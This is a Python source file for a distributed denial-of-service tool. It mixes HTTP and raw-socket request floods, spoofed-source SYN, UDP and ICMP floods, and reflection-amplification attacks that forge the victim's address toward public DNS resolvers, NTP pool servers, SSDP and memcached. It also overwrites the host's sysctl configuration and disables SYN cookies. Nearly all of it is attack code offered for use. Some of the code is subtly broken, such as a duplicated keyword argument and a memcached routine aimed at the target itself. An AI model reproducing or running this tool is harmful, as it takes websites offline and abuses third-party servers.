import os
import sys
import time
import random
import string
import asyncio
import socket
import ssl
import struct
import json
import base64
import hashlib
import threading
import multiprocessing
import subprocess
import ipaddress
import urllib.parse
import uuid
import ctypes
import resource
import psutil
import netifaces
import dns.resolver
import aiohttp
import uvloop
import dpkt
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from datetime import datetime
from multiprocessing import Process, Queue, Manager, Value, Array, shared_memory, Pool
from functools import partial, lru_cache
import numpy as np

TARGET_URL = os.getenv("TARGET_URL", "https://example.com/")
DURATION = int(os.getenv("DURATION", "300"))
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "100000"))
CONNECTIONS_PER_WORKER = int(os.getenv("CONNECTIONS_PER_WORKER", "10000"))
REQUESTS_PER_CONNECTION = int(os.getenv("REQUESTS_PER_CONNECTION", "10000"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0"
]

ACCEPT_LANG = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja,en;q=0.9",
    "ko,en;q=0.9",
    "ru,en;q=0.9",
    "de,en;q=0.9",
    "fr,en;q=0.9",
    "es,en;q=0.9",
    "pt-BR,pt;q=0.9,en;q=0.8"
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.github.com/",
    "https://www.stackoverflow.com/"
]

class SystemOptimizer:
    @staticmethod
    def optimize_system_limits():
        try:
            if os.name == 'posix':
                resource.setrlimit(resource.RLIMIT_NOFILE, (9999999, 9999999))
                os.system("echo 'net.core.rmem_max = 1342177280' > /etc/sysctl.conf")
                os.system("echo 'net.core.wmem_max = 1342177280' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_rmem = 4096 87380 1342177280' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_wmem = 4096 65536 1342177280' >> /etc/sysctl.conf")
                os.system("echo 'net.core.netdev_max_backlog = 1000000' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_congestion_control = bbr' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_tw_reuse = 1' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_fin_timeout = 1' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_keepalive_time = 600' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_max_syn_backlog = 1000000' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_syncookies = 0' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.ip_local_port_range = 1024 65535' >> /etc/sysctl.conf")
                os.system("echo 'fs.file-max = 100000000' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_timestamps = 0' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_sack = 1' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_window_scaling = 1' >> /etc/sysctl.conf")
                os.system("echo 'net.core.somaxconn = 1000000' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_max_tw_buckets = 1000000' >> /etc/sysctl.conf")
                os.system("echo 'net.ipv4.tcp_fastopen = 3' >> /etc/sysctl.conf")
                os.system("sysctl -p")
                os.system("ulimit -n 9999999")
            else:
                import ctypes
                ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1)
        except:
            pass

    @staticmethod
    def get_optimal_workers():
        try:
            cpu_count = multiprocessing.cpu_count()
            mem_gb = psutil.virtual_memory().total / (1024**3)
            return min(int(cpu_count * 500), int(mem_gb * 200), 500000)
        except:
            return 100000

class NetworkUtils:
    @staticmethod
    def get_target_info(url):
        try:
            parsed = urllib.parse.urlparse(url)
            hostname = parsed.hostname
            
            try:
                ip = socket.gethostbyname(hostname)
            except:
                ip = hostname
            
            try:
                answers = dns.resolver.resolve(hostname, 'A')
                ips = [str(r) for r in answers]
            except:
                ips = [ip]
            
            return {
                "hostname": hostname,
                "ip": ip,
                "ips": ips,
                "port": parsed.port or (443 if parsed.scheme == 'https' else 80),
                "scheme": parsed.scheme
            }
        except:
            return {
                "hostname": "unknown",
                "ip": "0.0.0.0",
                "ips": ["0.0.0.0"],
                "port": 443,
                "scheme": "https"
            }
    
    @staticmethod
    def get_local_interfaces():
        try:
            interfaces = []
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr_info in addrs[netifaces.AF_INET]:
                        interfaces.append(addr_info['addr'])
            return interfaces
        except:
            return ["127.0.0.1"]

class PayloadGenerator:
    @staticmethod
    def generate_random_path():
        chars = string.ascii_letters + string.digits + "/-_.~"
        return '/' + ''.join(random.choice(chars) for _ in range(random.randint(5, 100)))
    
    @staticmethod
    def generate_random_query_params():
        params = {}
        num_params = random.randint(1, 50)
        for _ in range(num_params):
            key = ''.join(random.choice(string.ascii_letters) for _ in range(random.randint(3, 20)))
            value = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(3, 50)))
            params[key] = value
        return urllib.parse.urlencode(params)
    
    @staticmethod
    def generate_random_headers():
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Language": random.choice(ACCEPT_LANG),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Referer": random.choice(REFERERS),
            "DNT": str(random.randint(0, 1)),
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0"
        }
        
        if random.random() > 0.7:
            headers["X-Forwarded-For"] = ".".join(str(random.randint(1, 255)) for _ in range(4))
        
        if random.random() > 0.8:
            headers["Cookie"] = "; ".join(
                f"{''.join(random.choice(string.ascii_letters) for _ in range(random.randint(3, 8)))}="
                f"{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(10, 50)))}"
                for _ in range(random.randint(1, 10))
            )
        
        return headers
    
    @staticmethod
    def fuzz_url(base_url):
        parsed = urllib.parse.urlparse(base_url)
        path = parsed.path
        query = parsed.query
        
        if random.random() > 0.7:
            path += PayloadGenerator.generate_random_path()
        
        if random.random() > 0.5:
            if query:
                query += "&" + PayloadGenerator.generate_random_query_params()
            else:
                query = PayloadGenerator.generate_random_query_params()
        
        return urllib.parse.urlunparse((
            parsed.scheme,
            parsed.netloc,
            path,
            parsed.params,
            query,
            parsed.fragment
        ))

class RawSocketAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
        self.connections = []
    
    async def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(0.1)
            
            target_ip = random.choice(self.target_info["ips"])
            
            if self.target_info["port"] == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target_info["hostname"])
            
            sock.connect((target_ip, self.target_info["port"]))
            return sock
        except:
            return None
    
    async def send_request(self, sock, url, headers):
        try:
            parsed_url = urllib.parse.urlparse(url)
            path = parsed_url.path
            if parsed_url.query:
                path += "?" + parsed_url.query
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {self.target_info['hostname']}\r\n"
            
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            
            request += "\r\n"
            
            sock.send(request.encode())
            response = sock.recv(1024)
            
            if response:
                status_line = response.split(b'\r\n')[0]
                status_code = int(status_line.split(b' ')[1])
                return status_code
            return 0
        except:
            return None
    
    async def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        for _ in range(CONNECTIONS_PER_WORKER):
            conn = await self.create_connection()
            if conn:
                self.connections.append(conn)
        
        while time.time() < end_time:
            tasks = []
            headers = PayloadGenerator.generate_random_headers()
            url = PayloadGenerator.fuzz_url(TARGET_URL)
            
            for conn in self.connections:
                if conn:
                    tasks.append(self.send_request(conn, url, headers))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in results:
                if isinstance(res, Exception):
                    with self.stats["lock"]:
                        self.stats["fail"] += 1
                else:
                    if res and 200 <= res < 300:
                        with self.stats["lock"]:
                            self.stats["success"] += 1
                    else:
                        with self.stats["lock"]:
                            self.stats["fail"] += 1
            
            await asyncio.sleep(0.00001)
        
        for conn in self.connections:
            try:
                conn.close()
            except:
                pass

class HTTPAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
        self.session = None
    
    async def init_session(self):
        connector = aiohttp.TCPConnector(
            limit=CONNECTIONS_PER_WORKER * 10,
            limit_per_host=CONNECTIONS_PER_WORKER * 10,
            ttl_dns_cache=300,
            use_dns_cache=True,
            family=socket.AF_INET,
            ssl=False,
            enable_cleanup_closed=True,
            force_close=False,
            keepalive_timeout=60,
            use_dns_cache=True
        )
        
        timeout = aiohttp.ClientTimeout(total=0.1)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout
        )
    
    async def send_request(self, url, headers):
        try:
            async with self.session.get(url, headers=headers, ssl=False) as response:
                return response.status
        except:
            return None
    
    async def run(self):
        await self.init_session()
        
        start_time = time.time()
        end_time = start_time + DURATION
        
        while time.time() < end_time:
            tasks = []
            headers = PayloadGenerator.generate_random_headers()
            url = PayloadGenerator.fuzz_url(TARGET_URL)
            
            for _ in range(REQUESTS_PER_CONNECTION):
                tasks.append(self.send_request(url, headers))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for res in results:
                if isinstance(res, Exception):
                    with self.stats["lock"]:
                        self.stats["fail"] += 1
                else:
                    if res and 200 <= res < 300:
                        with self.stats["lock"]:
                            self.stats["success"] += 1
                    else:
                        with self.stats["lock"]:
                            self.stats["fail"] += 1
            
            await asyncio.sleep(0.00001)
        
        await self.session.close()

class SYNAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def generate_ip(self):
        return ".".join(str(random.randint(1, 255)) for _ in range(4))
    
    def generate_port(self):
        return random.randint(1024, 65535)
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        target_port = self.target_info["port"]
        
        while time.time() < end_time:
            try:
                for _ in range(1000):
                    ip = self.generate_ip()
                    port = self.generate_port()
                    
                    ip_header = scapy.IP(src=ip, dst=target_ip)
                    tcp_header = scapy.TCP(sport=port, dport=target_port, flags="S")
                    
                    packet = ip_header / tcp_header
                    scapy.send(packet, verbose=0, count=1)
                
                with self.stats["lock"]:
                    self.stats["success"] += 1000
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += 1000

class UDPAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def generate_ip(self):
        return ".".join(str(random.randint(1, 255)) for _ in range(4))
    
    def generate_port(self):
        return random.randint(1024, 65535)
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        while time.time() < end_time:
            try:
                for _ in range(1000):
                    ip = self.generate_ip()
                    port = self.generate_port()
                    
                    ip_header = scapy.IP(src=ip, dst=target_ip)
                    udp_header = scapy.UDP(sport=port, dport=random.randint(1, 65535))
                    
                    payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(100, 1000)))
                    
                    packet = ip_header / udp_header / payload
                    scapy.send(packet, verbose=0, count=1)
                
                with self.stats["lock"]:
                    self.stats["success"] += 1000
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += 1000

class ICMPAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def generate_ip(self):
        return ".".join(str(random.randint(1, 255)) for _ in range(4))
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        while time.time() < end_time:
            try:
                for _ in range(1000):
                    ip = self.generate_ip()
                    
                    ip_header = scapy.IP(src=ip, dst=target_ip)
                    icmp_header = scapy.ICMP()
                    
                    payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(100, 1000)))
                    
                    packet = ip_header / icmp_header / payload
                    scapy.send(packet, verbose=0, count=1)
                
                with self.stats["lock"]:
                    self.stats["success"] += 1000
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += 1000

class DNSAmplificationAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        dns_servers = [
            "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
            "9.9.9.9", "208.67.222.222", "208.67.220.220"
        ]
        
        while time.time() < end_time:
            try:
                for dns_server in dns_servers:
                    ip_header = scapy.IP(src=target_ip, dst=dns_server)
                    udp_header = scapy.UDP(sport=random.randint(1024, 65535), dport=53)
                    
                    dns_header = scapy.DNS(rd=1, qd=scapy.DNSQR(qname="google.com", qtype="ANY"))
                    
                    packet = ip_header / udp_header / dns_header
                    scapy.send(packet, verbose=0, count=10)
                
                with self.stats["lock"]:
                    self.stats["success"] += len(dns_servers) * 10
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += len(dns_servers) * 10

class NTPAmplificationAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        ntp_servers = [
            "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org", "3.pool.ntp.org"
        ]
        
        while time.time() < end_time:
            try:
                for ntp_server in ntp_servers:
                    try:
                        ntp_ip = socket.gethostbyname(ntp_server)
                    except:
                        continue
                    
                    ip_header = scapy.IP(src=target_ip, dst=ntp_ip)
                    udp_header = scapy.UDP(sport=random.randint(1024, 65535), dport=123)
                    
                    ntp_data = b'\x17' + b'\x00' + b'\x03' + b'\x2a' + b'\x00' + b'\x00' + b'\x00' + b'\x00'
                    
                    packet = ip_header / udp_header / ntp_data
                    scapy.send(packet, verbose=0, count=10)
                
                with self.stats["lock"]:
                    self.stats["success"] += len(ntp_servers) * 10
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += len(ntp_servers) * 10

class SSDPAmplificationAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        while time.time() < end_time:
            try:
                for _ in range(10):
                    ip_header = scapy.IP(src=target_ip, dst="239.255.255.250")
                    udp_header = scapy.UDP(sport=random.randint(1024, 65535), dport=1900)
                    
                    ssdp_data = (
                        b'M-SEARCH * HTTP/1.1\r\n'
                        b'HOST: 239.255.255.250:1900\r\n'
                        b'MAN: "ssdp:discover"\r\n'
                        b'MX: 2\r\n'
                        b'ST: ssdp:all\r\n'
                        b'\r\n'
                    )
                    
                    packet = ip_header / udp_header / ssdp_data
                    scapy.send(packet, verbose=0, count=10)
                
                with self.stats["lock"]:
                    self.stats["success"] += 100
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += 100

class MemcachedAmplificationAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
    
    def run(self):
        start_time = time.time()
        end_time = start_time + DURATION
        
        target_ip = random.choice(self.target_info["ips"])
        
        memcached_servers = [
            "11211", "21211", "31211"
        ]
        
        while time.time() < end_time:
            try:
                for port in memcached_servers:
                    try:
                        for _ in range(5):
                            ip_header = scapy.IP(src=target_ip, dst=target_ip)
                            udp_header = scapy.UDP(sport=random.randint(1024, 65535), dport=int(port))
                            
                            memcached_data = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n'
                            
                            packet = ip_header / udp_header / memcached_data
                            scapy.send(packet, verbose=0, count=5)
                    except:
                        continue
                
                with self.stats["lock"]:
                    self.stats["success"] += len(memcached_servers) * 25
            except:
                with self.stats["lock"]:
                    self.stats["fail"] += len(memcached_servers) * 25

class MixedAttacker:
    def __init__(self, target_info, worker_id, stats):
        self.target_info = target_info
        self.worker_id = worker_id
        self.stats = stats
        self.raw_attacker = RawSocketAttacker(target_info, worker_id, stats)
        self.http_attacker = HTTPAttacker(target_info, worker_id, stats)
        self.syn_attacker = SYNAttacker(target_info, worker_id, stats)
        self.udp_attacker = UDPAttacker(target_info, worker_id, stats)
        self.icmp_attacker = ICMPAttacker(target_info, worker_id, stats)
        self.dns_attacker = DNSAmplificationAttacker(target_info, worker_id, stats)
        self.ntp_attacker = NTPAmplificationAttacker(target_info, worker_id, stats)
        self.ssdp_attacker = SSDPAmplificationAttacker(target_info, worker_id, stats)
        self.memcached_attacker = MemcachedAmplificationAttacker(target_info, worker_id, stats)
    
    async def run(self):
        attack_type = random.random()
        
        if attack_type < 0.125:
            await self.raw_attacker.run()
        elif attack_type < 0.25:
            await self.http_attacker.run()
        elif attack_type < 0.375:
            self.syn_attacker.run()
        elif attack_type < 0.5:
            self.udp_attacker.run()
        elif attack_type < 0.625:
            self.icmp_attacker.run()
        elif attack_type < 0.75:
            self.dns_attacker.run()
        elif attack_type < 0.875:
            self.ntp_attacker.run()
        elif attack_type < 0.95:
            self.ssdp_attacker.run()
        else:
            self.memcached_attacker.run()

async def worker_process(worker_id, target_info, stats):
    attacker = MixedAttacker(target_info, worker_id, stats)
    await attacker.run()

def start_worker(worker_id, target_info, stats):
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(worker_process(worker_id, target_info, stats))
    loop.close()

def stats_monitor(stats, start_time):
    last_success = 0
    last_fail = 0
    last_time = start_time
    
    while True:
        time.sleep(0.5)
        current_time = time.time()
        elapsed = current_time - start_time
        
        if elapsed > DURATION:
            break
        
        current_success = stats["success"]
        current_fail = stats["fail"]
        
        success_rate = (current_success - last_success) / (current_time - last_time)
        fail_rate = (current_fail - last_fail) / (current_time - last_time)
        
        print(f"\rTime: {elapsed:.1f}s | Success: {current_success} | Fail: {current_fail} | "
              f"Success Rate: {success_rate:.1f}/s | Fail Rate: {fail_rate:.1f}/s", end="")
        
        last_success = current_success
        last_fail = current_fail
        last_time = current_time

def main():
    SystemOptimizer.optimize_system_limits()
    
    optimal_workers = SystemOptimizer.get_optimal_workers()
    actual_workers = min(MAX_WORKERS, optimal_workers)
    
    print(f"Starting attack with {actual_workers} workers")
    print(f"Target: {TARGET_URL}")
    
    target_info = NetworkUtils.get_target_info(TARGET_URL)
    print(f"Target IP: {target_info['ip']}")
    print(f"All IPs: {target_info['ips']}")
    print(f"Duration: {DURATION} seconds")
    
    manager = Manager()
    stats = manager.dict()
    stats["success"] = 0
    stats["fail"] = 0
    stats["lock"] = manager.Lock()
    
    start_time = time.time()
    
    stats_thread = threading.Thread(target=stats_monitor, args=(stats, start_time))
    stats_thread.daemon = True
    stats_thread.start()
    
    processes = []
    for i in range(actual_workers):
        p = Process(target=start_worker, args=(i, target_info, stats))
        p.daemon = True
        p.start()
        processes.append(p)
    
    for p in processes:
        p.join()
    
    elapsed = time.time() - start_time
    total = stats["success"] + stats["fail"]
    
    print(f"\n\n=== Flood Result ===")
    print(f"Target: {TARGET_URL}")
    print(f"Duration: {elapsed:.2f} seconds")
    print(f"Workers: {actual_workers}")
    print(f"Connections per worker: {CONNECTIONS_PER_WORKER}")
    print(f"Requests per connection: {REQUESTS_PER_CONNECTION}")
    print(f"Total requests: {total}")
    print(f"Success: {stats['success']}")
    print(f"Fail: {stats['fail']}")
    print(f"RPS: {total / elapsed:.2f}")

if __name__ == "__main__":
    main()
